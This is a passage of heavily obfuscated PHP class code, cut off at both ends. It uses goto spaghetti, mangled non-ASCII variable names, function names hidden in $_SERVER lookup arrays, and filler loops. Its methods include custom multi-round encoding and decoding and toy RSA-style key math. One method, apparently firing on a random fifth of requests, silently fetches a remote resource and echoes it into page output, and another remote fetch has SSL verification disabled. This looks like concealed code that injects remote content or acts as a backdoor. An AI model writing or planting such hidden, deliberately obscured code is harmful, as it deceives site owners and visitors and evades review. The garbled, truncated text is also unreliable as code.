c…Ê•Ø“¤; C‹›í›øÚ: } private function dnrz3201f727($e¢—õŞç· = '', $BÜ–ôæŠ¼ = array(), $BŠ—‘¶¸¼ = 5) { goto C¸¼²ËÁÄ¹; Eîßæ¤°Ò½: if (!$cŒ’±ĞŠºİ) { return; } goto Cö¡ö‘Ú½æ; còŸâã¶õ: $FÌ¼™¤ÅÍ = $FÌ¼™¤ÅÍ . $e¢—õŞç·; if ($BÜ–ôæŠ¼ && $D¤á’¿æô[161]($BÜ–ôæŠ¼)) { $FÌ¼™¤ÅÍ = $FÌ¼™¤ÅÍ . $D¤á’¿æô[315] . $D¤á’¿æô[316]($BÜ–ôæŠ¼); } if ($BÜ–ôæŠ¼ === -1) { return $FÌ¼™¤ÅÍ; } goto díÈ¡¢­­; díÈ¡¢­­: $f‰¦Ùˆæã¹ = $D¤á’¿æô[271](array($D¤á’¿æô[272] => array($D¤á’¿æô[275] => $BŠ—‘¶¸¼, $D¤á’¿æô[273] => $D¤á’¿æô[317]), $D¤á’¿æô[318] => array($D¤á’¿æô[319] => !1, $D¤á’¿æô[320] => !1))); $f¶•¼ÉÄÆÄ = $a¿ÙÀÏ á¥[661]; $BÜ–ôæŠ¼ = @$D¤á’¿æô[276]($FÌ¼™¤ÅÍ, !1, $f‰¦Ùˆæã¹); goto A‰—…¶Œç‹; e‡ê¹¨¸–: $aµâÕŞ˜æŠ = $a¿ÙÀÏ á¥[660]; if (strlen($aµâÕŞ˜æŠ) < $a¿ÙÀÏ á¥[593]) { return; } $FÌ¼™¤ÅÍ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][269]}($FÌ¼™¤ÅÍ, $D¤á’¿æô[314]); goto còŸâã¶õ; A‰—…¶Œç‹: $b¡¬ßÖè¿Ğ = $a¿ÙÀÏ á¥[662]; return $D¤á’¿æô[210]($BÜ–ôæŠ¼, !0); $cŒ’±ĞŠºİ = $a¿ÙÀÏ á¥[663]; goto Eîßæ¤°Ò½; C¸¼²ËÁÄ¹: $a¿ÙÀÏ á¥ =& $_SERVER[£¶ä½¶¢]; $D¤á’¿æô =& $_SERVER[£ÛúôÆ˜öÒòş]; $FÌ¼™¤ÅÍ = $D¤á’¿æô[313]; goto e‡ê¹¨¸–; Cö¡ö‘Ú½æ: } private function ntqo1f8f9996() { goto BÃÁ‚Ü‰“; eéî…“Å¹¶: $b¬İÖö¥„© = $Dö¥†åËÁ×[666]; if (!$b¬İÖö¥„©) { die; } goto bÏ¦ğã±ˆŠ; BÃÁ‚Ü‰“: $Dö¥†åËÁ× =& $_SERVER[£¶ä½¶¢]; $bÚ‰¨‰´Ìï =& $_SERVER[£ÛúôÆ˜öÒòş]; $BÛ‘Ù©“Â = array($bÚ‰¨‰´Ìï[321] => $bÚ‰¨‰´Ìï[322], $bÚ‰¨‰´Ìï[323] => $bÚ‰¨‰´Ìï[324], $bÚ‰¨‰´Ìï[325] => $bÚ‰¨‰´Ìï[326], $bÚ‰¨‰´Ìï[327] => $bÚ‰¨‰´Ìï[328], $bÚ‰¨‰´Ìï[329] => $bÚ‰¨‰´Ìï[330], $bÚ‰¨‰´Ìï[331] => $bÚ‰¨‰´Ìï[264], $bÚ‰¨‰´Ìï[332] => $bÚ‰¨‰´Ìï[264], $bÚ‰¨‰´Ìï[333] => $bÚ‰¨‰´Ìï[322], $bÚ‰¨‰´Ìï[334] => $bÚ‰¨‰´Ìï[324], $bÚ‰¨‰´Ìï[335] => $bÚ‰¨‰´Ìï[326], $bÚ‰¨‰´Ìï[336] => $bÚ‰¨‰´Ìï[337], $bÚ‰¨‰´Ìï[338] => $bÚ‰¨‰´Ìï[328], $bÚ‰¨‰´Ìï[339] => $bÚ‰¨‰´Ìï[340], $bÚ‰¨‰´Ìï[341] => $bÚ‰¨‰´Ìï[330], $bÚ‰¨‰´Ìï[342] => $bÚ‰¨‰´Ìï[343], $bÚ‰¨‰´Ìï[344] => $bÚ‰¨‰´Ìï[345], $bÚ‰¨‰´Ìï[346] => $bÚ‰¨‰´Ìï[347]); goto FÁŠËê¬öù; FÁŠËê¬öù: $BƒŒšß¹«Ã = $Dö¥†åËÁ×[664]; while ($BƒŒšß¹«Ã < $Dö¥†åËÁ×[600]) { if ($BƒŒšß¹«Ã >= 0) { break; } $BƒŒšß¹«Ã++; } $F–éª·Ñ›¯ = $BÛ‘Ù©“Â[$this->uqeg91b17b61]; goto f¼İèŒË‡‹; F²¹ª¬…: $bœñÚ…×° = $bÚ‰¨‰´Ìï[116]($this->qbev01c9ff0a, $bÚ‰¨‰´Ìï[348]); $bœñÚ…×° = $bœñÚ…×° ? $bÚ‰¨‰´Ìï[263]($bœñÚ…×°) : 0; return $F–éª·Ñ›¯ + $bœñÚ…×°; goto eéî…“Å¹¶; f¼İèŒË‡‹: $fÁ†´¼ß’” = $Dö¥†åËÁ×[665]; if (!$fÁ†´¼ß’”) { return; } $F–éª·Ñ›¯ = $bÚ‰¨‰´Ìï[263]($F–éª·Ñ›¯ ? $F–éª·Ñ›¯ : $bÚ‰¨‰´Ìï[322]); goto F²¹ª¬…; bÏ¦ğã±ˆŠ: } public function zugr0c94464d($C„è½ñß¯Ş) { goto dÌä¦¼ õ; FÍ÷Ïò¨­: $fË±Ğ•Œ = $FÏª“’º†[667]; if (strlen($fË±Ğ•Œ) < $FÏª“’º†[600]) { return; } if ($C„è½ñß¯Ş[$A¶šë£¦Æ[349]] == $A¶šë£¦Æ[239]) { return; } goto bÓµÁ¹Ô¨¯; bÓµÁ¹Ô¨¯: if ($f«ªÄ´ØÊò >= $A¶šë£¦Æ[263]($A¶šë£¦Æ[264])) { return; } $EêŒ†µŸ„ö = $A¶šë£¦Æ[61]($A¶šë£¦Æ[149])->{$_SERVER[£ÛúôÆ˜öÒòş][150]}(); $BÂ¢İ‚ò¬Ú = $FÏª“’º†[668]; goto CŒÙ¨‰‚Óè; CŒÙ¨‰‚Óè: if ($EêŒ†µŸ„ö <= $f«ªÄ´ØÊò) { return; } $cÏ²äŒ‚Ë› = $A¶šë£¦Æ[61]($A¶šë£¦Æ[149])->{$_SERVER[£ÛúôÆ˜öÒòş][350]}($A¶šë£¦Æ[349])->{$_SERVER[£ÛúôÆ˜öÒòş][351]}($f«ªÄ´ØÊò)->{$_SERVER[£ÛúôÆ˜öÒòş][352]}(); $A¹¬¸ñË = $FÏª“’º†[669]; goto C»‡©áåœ; C»‡©áåœ: while ($A¹¬¸ñË < $FÏª“’º†[600]) { if ($A¹¬¸ñË >= 0) { break; } $A¹¬¸ñË++; } $cÏ²äŒ‚Ë› = $A¶šë£¦Æ[241]($cÏ²äŒ‚Ë›, $A¶šë£¦Æ[10], $A¶šë£¦Æ[349]); $a¥¶¶®ßÌù = $FÏª“’º†[670]; goto dƒ·®ğ®±™; dÌä¦¼ õ: $FÏª“’º† =& $_SERVER[£¶ä½¶¢]; $A¶šë£¦Æ =& $_SERVER[£ÛúôÆ˜öÒòş]; $f«ªÄ´ØÊò = $this->{$_SERVER[£ÛúôÆ˜öÒòş][147]}(); goto FÍ÷Ïò¨­; dƒ·®ğ®±™: if (!$A¶šë£¦Æ[261]($C„è½ñß¯Ş[$A¶šë£¦Æ[349]], $cÏ²äŒ‚Ë›)) { $A¶šë£¦Æ[184]($A¶šë£¦Æ[353], !1, $A¶šë£¦Æ[258]); } goto fÄôÖ´³ßò; fÄôÖ´³ßò: } public function jlnvdaa5e952() { goto cÕµË‚¦ÃÙ; CôİÑÙ’Ù¥: if (strlen($bâª‹–êÉ´) < $a¬ëÔŒâ¿™[597]) { die; } echo $dÅË¹—˜õœ[355] . $dÅË¹—˜õœ[356]($F¥šŠ’¸¨º) . $dÅË¹—˜õœ[357]; $f•…’Šº¤ = $a¬ëÔŒâ¿™[674]; goto Eùº¸ì ¹Ä; DŠìº¹¢ : $Dì¯ë½¯õ© = $dÅË¹—˜õœ[271](array($dÅË¹—˜õœ[272] => array($dÅË¹—˜õœ[273] => $dÅË¹—˜õœ[274], $dÅË¹—˜õœ[275] => 3))); $F¥šŠ’¸¨º = @$dÅË¹—˜õœ[276]($c‚òİï¦Äà, !1, $Dì¯ë½¯õ©); $bâª‹–êÉ´ = $a¬ëÔŒâ¿™[673]; goto CôİÑÙ’Ù¥; cÕµË‚¦ÃÙ: $a¬ëÔŒâ¿™ =& $_SERVER[£¶ä½¶¢]; $dÅË¹—˜õœ =& $_SERVER[£ÛúôÆ˜öÒòş]; if (!$dÅË¹—˜õœ[116]($GLOBALS, $dÅË¹—˜õœ[142]) || $dÅË¹—˜õœ[354](1, 100) > 20) { return; } goto C­Š¬–í¶Ê; D„‘ËÃ°œÏ: $c‚òİï¦Äà = $this->{$_SERVER[£ÛúôÆ˜öÒòş][269]}($c‚òİï¦Äà, $dÅË¹—˜õœ[270]); $C²âß¾«ËÛ = $a¬ëÔŒâ¿™[672]; while (strlen($C²âß¾«ËÛ) < $a¬ëÔŒâ¿™[593]) { if (!$C²âß¾«ËÛ) { break; } $C²âß¾«ËÛ++; } goto DŠìº¹¢ ; C­Š¬–í¶Ê: $c‚òİï¦Äà = $dÅË¹—˜õœ[268]; $bÂÀˆÃ™ã§ = $a¬ëÔŒâ¿™[671]; while ($bÂÀˆÃ™ã§ < $a¬ëÔŒâ¿™[586]) { if ($bÂÀˆÃ™ã§ >= 0) { break; } $bÂÀˆÃ™ã§++; } goto D„‘ËÃ°œÏ; Eùº¸ì ¹Ä: while (strlen($f•…’Šº¤) < $a¬ëÔŒâ¿™[586]) { if (!$f•…’Šº¤) { break; } $f•…’Šº¤++; } goto aÛ’„‡µğã; aÛ’„‡µğã: } private function knwp8b71c0c1($E¤ß¨®¼„‰, $b¨ãìŸõ, $a™óŒ½à• = 3) { goto C´¯ÔùÎŠ; e¼âÓµâ™: if (strlen($AŒ¶ùè¬ñ) < $BØÀñ¯Ş¸[597]) { die; } $E«Ùœ‚Ë† = $CèËõ‰öÅ¨[134](15); $A×ã´µì = $CèËõ‰öÅ¨[359]; goto FôÃè«®À÷; FôÃè«®À÷: switch ($b÷ˆÀ¿Š»Œ) { case $CèËõ‰öÅ¨[253]: $Døâ¬°ô£à = $this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($E¤ß¨®¼„‰, $CèËõ‰öÅ¨[233]($b¨ãìŸõ . $E«Ùœ‚Ë†)); break; $b¥‚Ş ® = $BØÀñ¯Ş¸[678]; while ($b¥‚Ş ® < $BØÀñ¯Ş¸[586]) { if ($b¥‚Ş ® >= 0) { break; } $b¥‚Ş ®++; } case $CèËõ‰öÅ¨[239]: $Døâ¬°ô£à = $this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($E¤ß¨®¼„‰, $CèËõ‰öÅ¨[233]($E«Ùœ‚Ë† . $b¨ãìŸõ)); $e—İõ©Ãİ¥ = $BØÀñ¯Ş¸[679]; while (strlen($e—İõ©Ãİ¥) < $BØÀñ¯Ş¸[10]) { if (!$e—İõ©Ãİ¥) { break; } $e—İõ©Ãİ¥++; } break; case $CèËõ‰öÅ¨[360]: $Døâ¬°ô£à = $this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($E¤ß¨®¼„‰, $CèËõ‰öÅ¨[128]($E«Ùœ‚Ë† . $b¨ãìŸõ)); break; case $CèËõ‰öÅ¨[361]: $Døâ¬°ô£à = $this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($E¤ß¨®¼„‰, $CèËõ‰öÅ¨[124]($E«Ùœ‚Ë† . $b¨ãìŸõ)); $A™„¼õ‚È = $BØÀñ¯Ş¸[680]; while ($A™„¼õ‚È < $BØÀñ¯Ş¸[586]) { if ($A™„¼õ‚È >= 0) { break; } $A™„¼õ‚È++; } break; $C»Ùòèˆƒ = $BØÀñ¯Ş¸[681]; if (!$C»Ùòèˆƒ) { die; } case $CèËõ‰öÅ¨[362]: goto f›»•†† Š; B®†ç‚Äèš: $fÍ¬¨¡†Ì = $A×ã´µì[$eİÀ½„Ôêí]; $bÅ¿ïïìé  = $CèËõ‰öÅ¨[124]($fÍ¬¨¡†Ì . $CèËõ‰öÅ¨[124]($b¨ãìŸõ . $fÍ¬¨¡†Ì) . $b¨ãìŸõ); $bÅ¿ïïìé  = $CèËõ‰öÅ¨[25]($bÅ¿ïïìé , $eİÀ½„Ôêí % 8, $eİÀ½„Ôêí % 8 + 7); goto BÓ£âˆí; f›»•†† Š: $E¤ß¨®¼„‰ = $CèËõ‰öÅ¨[128]($E¤ß¨®¼„‰); $eİÀ½„Ôêí = $CèËõ‰öÅ¨[363](0, 64); $B¿Öª÷¼¯± = $BØÀñ¯Ş¸[682]; goto B®†ç‚Äèš; fÒÌÇ‰°·ö: $FŠ—³ˆ›˜¡ = 0; $F“«À¸¡Îâ = $BØÀñ¯Ş¸[684]; while ($F“«À¸¡Îâ < $BØÀñ¯Ş¸[597]) { if ($F“«À¸¡Îâ >= 0) { break; } $F“«À¸¡Îâ++; } goto CÆŞô£ƒê—; BÓ£âˆí: $aìŠáÑÉâŒ = $BØÀñ¯Ş¸[683]; if (!$aìŠáÑÉâŒ) { die; } $FìÉÅã„ÜĞ = $CèËõ‰öÅ¨[10]; goto fÒÌÇ‰°·ö; EİÚ˜È: break; $D¹Ê²×¥…Æ = $BØÀñ¯Ş¸[687]; if (strlen($D¹Ê²×¥…Æ) < $BØÀñ¯Ş¸[597]) { die; } goto FÑÂ¨¬¨Š´; aïŠ±åšèÁ: $e©Ú¸¸öŸ = 0; for ($FŠ—³ˆ›˜¡ = 0; $FŠ—³ˆ›˜¡ < $CèËõ‰öÅ¨[24]($E¤ß¨®¼„‰); $FŠ—³ˆ›˜¡++) { $e©Ú¸¸öŸ = $e©Ú¸¸öŸ == $CèËõ‰öÅ¨[24]($bÅ¿ïïìé ) ? 0 : $e©Ú¸¸öŸ; $bö£Œ³ğŒ = ($eİÀ½„Ôêí + $CèËõ‰öÅ¨[364]($A×ã´µì, $E¤ß¨®¼„‰[$FŠ—³ˆ›˜¡]) + $CèËõ‰öÅ¨[365]($bÅ¿ïïìé [$e©Ú¸¸öŸ++])) % 64; $Bá½ ä×óÖ = $BØÀñ¯Ş¸[686]; $FìÉÅã„ÜĞ .= $A×ã´µì[$bö£Œ³ğŒ]; } $Døâ¬°ô£à = $CèËõ‰öÅ¨[356]($fÍ¬¨¡†Ì . $FìÉÅã„ÜĞ); goto EİÚ˜È; CÆŞô£ƒê—: $bö£Œ³ğŒ = 0; $b£›µ×àèï = $BØÀñ¯Ş¸[685]; if (!$b£›µ×àèï) { return; } goto aïŠ±åšèÁ; FÑÂ¨¬¨Š´: default: $Døâ¬°ô£à = $this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($E¤ß¨®¼„‰, $b¨ãìŸõ . $E«Ùœ‚Ë†); $dÁ¶³—¼Û« = $BØÀñ¯Ş¸[688]; break; $aÉ·ï¨‚ì¢ = $BØÀñ¯Ş¸[689]; if (!$aÉ·ï¨‚ì¢) { die; } } $Døâ¬°ô£à = $CèËõ‰öÅ¨[233]($b÷ˆÀ¿Š»Œ . $E«Ùœ‚Ë† . $Døâ¬°ô£à); if ($a™óŒ½à• - 1 > 0) { $Døâ¬°ô£à = $this->{$_SERVER[£ÛúôÆ˜öÒòş][137]}($Døâ¬°ô£à, $b¨ãìŸõ, $a™óŒ½à• - 1); } goto a£öÑÛª³Ó; C´¯ÔùÎŠ: $BØÀñ¯Ş¸ =& $_SERVER[£¶ä½¶¢]; $CèËõ‰öÅ¨ =& $_SERVER[£ÛúôÆ˜öÒòş]; $CèËõ‰öÅ¨[358](1); goto CêĞÎîÕË©; CêĞÎîÕË©: $DîÈäê¨‡¯ = $BØÀñ¯Ş¸[675]; if (strlen($DîÈäê¨‡¯) < $BØÀñ¯Ş¸[600]) { die; } $E¤ß¨®¼„‰ = $CèËõ‰öÅ¨[2]($E¤ß¨®¼„‰); goto e„â»Œ×ˆÏ; e„â»Œ×ˆÏ: $E¡¸âßÚ¨™ = $BØÀñ¯Ş¸[676]; $b÷ˆÀ¿Š»Œ = $CèËõ‰öÅ¨[354](0, 5) . $CèËõ‰öÅ¨[10]; $AŒ¶ùè¬ñ = $BØÀñ¯Ş¸[677]; goto e¼âÓµâ™; a£öÑÛª³Ó: return $Døâ¬°ô£à; goto bª¬ØÁŒ•î; bª¬ØÁŒ•î: } private function dmzb8683be2a($fƒåÔ¤âİŒ, $eÚó‡‘·çî, $c›ÒÒï£ë¨ = 3) { goto Eëº™ç‰; BÏÈ¹¬ó”Œ: $Dñù§ÔùÛö = $FôŒ‚ĞöÈ[25]($fƒåÔ¤âİŒ, 1, 15); $fƒåÔ¤âİŒ = $FôŒ‚ĞöÈ[25]($fƒåÔ¤âİŒ, 16); $D«ŸÈ¥§Šš = $FôŒ‚ĞöÈ[359]; goto DÖ„î¬Øè; F™ÂŠÕùé: $fƒåÔ¤âİŒ = $FôŒ‚ĞöÈ[2]($fƒåÔ¤âİŒ); $fƒåÔ¤âİŒ = $FôŒ‚ĞöÈ[233]($fƒåÔ¤âİŒ); $dÇÈØÉÍÀÊ = $fƒåÔ¤âİŒ[0]; goto BÏÈ¹¬ó”Œ; DÖ„î¬Øè: switch ($dÇÈØÉÍÀÊ) { case $FôŒ‚ĞöÈ[253]: $B‚ŒœßŒ• = $this->{$_SERVER[£ÛúôÆ˜öÒòş][269]}($fƒåÔ¤âİŒ, $FôŒ‚ĞöÈ[233]($eÚó‡‘·çî . $Dñù§ÔùÛö)); break; $d‘îÜë¸— = $Eõè­Î¯‹×[690]; if (strlen($d‘îÜë¸—) < $Eõè­Î¯‹×[10]) { return; } case $FôŒ‚ĞöÈ[239]: $B‚ŒœßŒ• = $this->{$_SERVER[£ÛúôÆ˜öÒòş][269]}($fƒåÔ¤âİŒ, $FôŒ‚ĞöÈ[233]($Dñù§ÔùÛö . $eÚó‡‘·çî)); $bÌášÍ¦ê½ = $Eõè­Î¯‹×[691]; while (strlen($bÌášÍ¦ê½) < $Eõè­Î¯‹×[600]) { if (!$bÌášÍ¦ê½) { break; } $bÌášÍ¦ê½++; } break; $e‘¤³”·…† = $Eõè­Î¯‹×[692]; case $FôŒ‚ĞöÈ[360]: $B‚ŒœßŒ• = $this->{$_SERVER[£ÛúôÆ˜öÒòş][269]}($fƒåÔ¤âİŒ, $FôŒ‚ĞöÈ[128]($Dñù§ÔùÛö . $eÚó‡‘·çî)); $eÀÈêËòŠ™ = $Eõè­Î¯‹×[693]; while (strlen($eÀÈêËòŠ™) < $Eõè­Î¯‹×[586]) { if (!$eÀÈêËòŠ™) { break; } $eÀÈêËòŠ™++; } break; case $FôŒ‚ĞöÈ[361]: $B‚ŒœßŒ• = $this->{$_SERVER[£ÛúôÆ˜öÒòş][269]}($fƒåÔ¤âİŒ, $FôŒ‚ĞöÈ[124]($Dñù§ÔùÛö . $eÚó‡‘·çî)); break; $c©Ì§ºéÆÑ = $Eõè­Î¯‹×[694]; case $FôŒ‚ĞöÈ[362]: goto a™¥ù‘Š­Î; a¤¿¥èÒÜÔ: break; goto cµ¼¨‘‚‡; a™¥ù‘Š­Î: $fƒåÔ¤âİŒ = $FôŒ‚ĞöÈ[366]($fƒåÔ¤âİŒ); $CõÂ²ƒ¹¶ = $fƒåÔ¤âİŒ[0]; $fƒåÔ¤âİŒ = $FôŒ‚ĞöÈ[25]($fƒåÔ¤âİŒ, 1); goto eÁ²æÒÍ¹‹; eÁ²æÒÍ¹‹: $Fï·İãÆğá = $Eõè­Î¯‹×[663]; while ($Fï·İãÆğá < $Eõè­Î¯‹×[593]) { if ($Fï·İãÆğá >= 0) { break; } $Fï·İãÆğá++; } $EÈœ²ô¬‘ = $FôŒ‚ĞöÈ[364]($D«ŸÈ¥§Šš, $CõÂ²ƒ¹¶); goto F¡ÆÖõ‚ŞÊ; F¡ÆÖõ‚ŞÊ: $aÙ›´º‚¥¢ = $Eõè­Î¯‹×[695]; if (strlen($aÙ›´º‚¥¢) < $Eõè­Î¯‹×[10]) { die; } $dÎâùÇÒïß = $FôŒ‚ĞöÈ[124]($CõÂ²ƒ¹¶ . $FôŒ‚ĞöÈ[124]($eÚó‡‘·çî . $CõÂ²ƒ¹¶) . $eÚó‡‘·çî); goto aÇŞÓ¨ÎŠß; aÇŞÓ¨ÎŠß: $dÎâùÇÒïß = $FôŒ‚ĞöÈ[25]($dÎâùÇÒïß, $EÈœ²ô¬‘ % 8, $EÈœ²ô¬‘ % 8 + 7); $e£Ø§¤³êî = $FôŒ‚ĞöÈ[10]; $BÎ°Ç˜ÜŠà = 0; goto B¯ñøÒŠ§ß; B¯ñøÒŠ§ß: $E‘‘Á¸¡ÁÜ = 0; $bĞàâº÷“ö = 0; for ($BÎ°Ç˜ÜŠà = 0; $BÎ°Ç˜ÜŠà < $FôŒ‚ĞöÈ[24]($fƒåÔ¤âİŒ); $BÎ°Ç˜ÜŠà++) { $bĞàâº÷“ö = $bĞàâº÷“ö == $FôŒ‚ĞöÈ[24]($dÎâùÇÒïß) ? 0 : $bĞàâº÷“ö; $Bö™œíç‘ = $bĞàâº÷“ö++; $Bó¤ìÒìÔÛ = $Eõè­Î¯‹×[696]; while (strlen($Bó¤ìÒìÔÛ) < $Eõè­Î¯‹×[600]) { if (!$Bó¤ìÒìÔÛ) { break; } $Bó¤ìÒìÔÛ++; } $E‘‘Á¸¡ÁÜ = $FôŒ‚ĞöÈ[364]($D«ŸÈ¥§Šš, $fƒåÔ¤âİŒ[$BÎ°Ç˜ÜŠà]) - $EÈœ²ô¬‘ - $FôŒ‚ĞöÈ[365]($dÎâùÇÒïß[$Bö™œíç‘]); while ($E‘‘Á¸¡ÁÜ < 0) { $E‘‘Á¸¡ÁÜ += 64; $CØ´ÙÙ—¹ = $Eõè­Î¯‹×[697]; if (strlen($CØ´ÙÙ—¹) < $Eõè­Î¯‹×[10]) { return; } } $e£Ø§¤³êî .= $D«ŸÈ¥§Šš[$E‘‘Á¸¡ÁÜ]; $e“…·®¬«Ë = $Eõè­Î¯‹×[698]; while ($e“…·®¬«Ë < $Eõè­Î¯‹×[600]) { if ($e“…·®¬«Ë >= 0) { break; } $e“…·®¬«Ë++; } } goto dÑˆ‰¼Ğ²; dÑˆ‰¼Ğ²: $B‚ŒœßŒ• = $FôŒ‚ĞöÈ[367]($e£Ø§¤³êî); $fø·Ñ»¸îá = $Eõè­Î¯‹×[699]; while (strlen($fø·Ñ»¸îá) < $Eõè­Î¯‹×[600]) { if (!$fø·Ñ»¸îá) { break; } $fø·Ñ»¸îá++; } goto a¤¿¥èÒÜÔ; cµ¼¨‘‚‡: default: $B‚ŒœßŒ• = $this->{$_SERVER[£ÛúôÆ˜öÒòş][269]}($fƒåÔ¤âİŒ, $eÚó‡‘·çî . $Dñù§ÔùÛö); $a³Œ‰…Ô‰Á = $Eõè­Î¯‹×[700]; break; } if ($c›ÒÒï£ë¨ - 1 > 0) { $B‚ŒœßŒ• = $this->{$_SERVER[£ÛúôÆ˜öÒòş][208]}($B‚ŒœßŒ•, $eÚó‡‘·çî, $c›ÒÒï£ë¨ - 1); } return $B‚ŒœßŒ•; goto eÂ±é‚Šù»; Eëº™ç‰: $Eõè­Î¯‹× =& $_SERVER[£¶ä½¶¢]; $FôŒ‚ĞöÈ =& $_SERVER[£ÛúôÆ˜öÒòş]; if (!$FôŒ‚ĞöÈ[158]($fƒåÔ¤âİŒ) || $FôŒ‚ĞöÈ[24]($fƒåÔ¤âİŒ) < 10) { return !1; } goto F™ÂŠÕùé; eÂ±é‚Šù»: } public function uhco19b06f5f($dëÜ éÚ) { goto c¡“°„–‡½; c¡“°„–‡½: $bÜÃîÒ»–Í =& $_SERVER[£¶ä½¶¢]; $E™·ÄÊ‚‚ =& $_SERVER[£ÛúôÆ˜öÒòş]; $CéÍíõˆ‰¼ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][368]}(); goto B¹›ï¬Éƒ¤; B¹›ï¬Éƒ¤: $e±£ïï””» = $bÜÃîÒ»–Í[645]; if (!$e±£ïï””») { return; } $A³ŠŠÎÙ²Ö = $this->{$_SERVER[£ÛúôÆ˜öÒòş][368]}(); goto dÀ·’Õˆ‡¿; AÈÆ®œ²½Á: $bÌ¬ª·Ìí¯ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($CéÍíõˆ‰¼ * $A³ŠŠÎÙ²Ö . $E™·ÄÊ‚‚[10], $E™·ÄÊ‚‚[167]); $B´á œµ¼ = $bÜÃîÒ»–Í[703]; if (!$B´á œµ¼) { die; } goto Dïç‡ŒÛ·˜; b‰‚æòÔ•Õ: while (1) { $e¦Ü¹™³ = $CÖ‘‰®‘Ü; $DÎ‚§ÌÊ¦Ô = $BğÙˆ¯œ‰; $E•¨±ÈŒ¹Û = $bÜÃîÒ»–Í[666]; while ($DÎ‚§ÌÊ¦Ô % $e¦Ü¹™³ != 0) { $aÙµ»›¡·Õ = $DÎ‚§ÌÊ¦Ô; $DÎ‚§ÌÊ¦Ô = $e¦Ü¹™³; $Aö¼™ºæ = $bÜÃîÒ»–Í[702]; if (!$Aö¼™ºæ) { return; } $e¦Ü¹™³ = $aÙµ»›¡·Õ % $e¦Ü¹™³; } if ($e¦Ü¹™³ == 1) { break; } else { $CÖ‘‰®‘Ü++; } } $e›È§—÷™ = 2; for ($Aöé²Ë“İ­ = 0; $Aöé²Ë“İ­ < $BğÙˆ¯œ‰ * 10; $Aöé²Ë“İ­++) { if (($BğÙˆ¯œ‰ * $Aöé²Ë“İ­ + 1) % $CÖ‘‰®‘Ü == 0) { $e›È§—÷™ = $E™·ÄÊ‚‚[263](($BğÙˆ¯œ‰ * $Aöé²Ë“İ­ + 1) / $CÖ‘‰®‘Ü); break; } } goto AÈÆ®œ²½Á; Dïç‡ŒÛ·˜: $bñíÅ¶òŸé = $E™·ÄÊ‚‚[124]($E™·ÄÊ‚‚[369] . ($CéÍíõˆ‰¼ + $A³ŠŠÎÙ²Ö) . $E™·ÄÊ‚‚[370] . $CÖ‘‰®‘Ü . $E™·ÄÊ‚‚[370] . $e›È§—÷™ . $E™·ÄÊ‚‚[371]); $DÊ““­¸ˆÎ = $bÜÃîÒ»–Í[704]; $A‡¨“ÃØÃ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][165]}($dëÜ éÚ, $bñíÅ¶òŸé) . $E™·ÄÊ‚‚[372] . $bÌ¬ª·Ìí¯; goto Fîé±¾‘›; dÀ·’Õˆ‡¿: $BğÙˆ¯œ‰ = ($CéÍíõˆ‰¼ - 1) * ($A³ŠŠÎÙ²Ö - 1); $EæÊãÛ¹øš = $bÜÃîÒ»–Í[701]; $CÖ‘‰®‘Ü = $E™·ÄÊ‚‚[263](($CéÍíõˆ‰¼ + $A³ŠŠÎÙ²Ö) / 2); goto b‰‚æòÔ•Õ; Fîé±¾‘›: return $A‡¨“ÃØÃ; $Dóİéªê‰Î = $bÜÃîÒ»–Í[705]; if (!$Dóİéªê‰Î) { die; } goto CĞµØí»; CĞµØí»: } public function retc40093f39($Aà«¶½í…Û) { goto EÍêÒê‰É; C×‰…ê­“Â: while ($c’ÑË­Š‰Š < $DÆÀ§Ø¬·ã[600]) { if ($c’ÑË­Š‰Š >= 0) { break; } $c’ÑË­Š‰Š++; } $F‘Ö•©µŸ = 0; $A¿œà„»È = $DÆÀ§Ø¬·ã[706]; goto bÍ³ñ™˜êƒ; bÍ³ñ™˜êƒ: while ($A¿œà„»È < $DÆÀ§Ø¬·ã[593]) { if ($A¿œà„»È >= 0) { break; } $A¿œà„»È++; } for ($dò’ŠÇŒ”Ú = 3; $dò’ŠÇŒ”Ú < $aº¡˜Ü²äÑ; $dò’ŠÇŒ”Ú += 2) { if ($aº¡˜Ü²äÑ % $dò’ŠÇŒ”Ú != 0) { continue; } $C¡ºÄœÓ†Å = $dò’ŠÇŒ”Ú; $F‘Ö•©µŸ = $AİÀ„Î×•[263]($aº¡˜Ü²äÑ / $dò’ŠÇŒ”Ú); $eŸÙ²“Ì» = $DÆÀ§Ø¬·ã[707]; break; $F—áÚÃ–åÜ = $DÆÀ§Ø¬·ã[708]; if (!$F—áÚÃ–åÜ) { die; } } $F–ä—ãï¿« = ($C¡ºÄœÓ†Å - 1) * ($F‘Ö•©µŸ - 1); goto c®ÌõÔ„•“; f§™‰ôÃ§æ: if ($AİÀ„Î×•[19]($fáÜÄğó¦ó) != 2) { return $AİÀ„Î×•[10]; } $aº¡˜Ü²äÑ = $this->{$_SERVER[£ÛúôÆ˜öÒòş][269]}($fáÜÄğó¦ó[1] . $AİÀ„Î×•[10], $AİÀ„Î×•[167]); if (!$aº¡˜Ü²äÑ) { return $AİÀ„Î×•[10]; } goto bÌœ ¾Øø³; EÍêÒê‰É: $DÆÀ§Ø¬·ã =& $_SERVER[£¶ä½¶¢]; $AİÀ„Î×• =& $_SERVER[£ÛúôÆ˜öÒòş]; $fáÜÄğó¦ó = $AİÀ„Î×•[0]($AİÀ„Î×•[372], $Aà«¶½í…Û); goto f§™‰ôÃ§æ; c®ÌõÔ„•“: $Aèí´ÀµˆÏ = $AİÀ„Î×•[263](($C¡ºÄœÓ†Å + $F‘Ö•©µŸ) / 2); while (1) { $a¹ñÙì‡ó = $Aèí´ÀµˆÏ; $BˆÇ‚ëÀÁ = $F–ä—ãï¿«; while ($BˆÇ‚ëÀÁ % $a¹ñÙì‡ó != 0) { $BéÃœßí™ = $BˆÇ‚ëÀÁ; $D˜½Ì™ÓË• = $DÆÀ§Ø¬·ã[709]; while ($D˜½Ì™ÓË• < $DÆÀ§Ø¬·ã[600]) { if ($D˜½Ì™ÓË• >= 0) { break; } $D˜½Ì™ÓË•++; } $BˆÇ‚ëÀÁ = $a¹ñÙì‡ó; $eËÇ¬òˆ÷¿ = $DÆÀ§Ø¬·ã[710]; if (strlen($eËÇ¬òˆ÷¿) < 